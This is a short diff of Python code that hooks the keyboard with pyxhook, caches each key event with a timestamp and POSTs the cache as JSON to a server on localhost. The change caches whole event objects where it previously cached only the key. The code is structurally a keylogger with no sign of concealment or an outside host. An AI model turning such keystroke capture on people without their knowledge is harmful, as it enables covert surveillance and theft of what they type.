@@ -9,7 +9,7 @@ import pyxhook
 import time
 import parsingTool
 import PackageData
-import CharacterData
+import EventData
 import json
 
 running = False
@@ -29,18 +29,18 @@ def sendData(cache):
     r = requests.post("http://127.0.0.1:8080/recieveData", data=json.dumps(stringData), headers=headers)
     print r
 
-def cacheData(dataChars, time):
+def cacheData(event, time):
     #This should create a JSON object as a cache... TODO
     #Only relevent data should be cached and stored. Need a filter... TODO
     #Cache data for certain period.
     global cache
-    cache.append(CharacterData.CharacterData(dataChars, time).getObject())
+    cache.append(EventData.EventData(event, time).getObject())
 
 def kbevent (event):
     #print event
     #print event
     # Cache the data.
-    cacheData(event.Key, time.time())
+    cacheData(event, time.time())
     #Send data to server after given period.
     #print cache
 
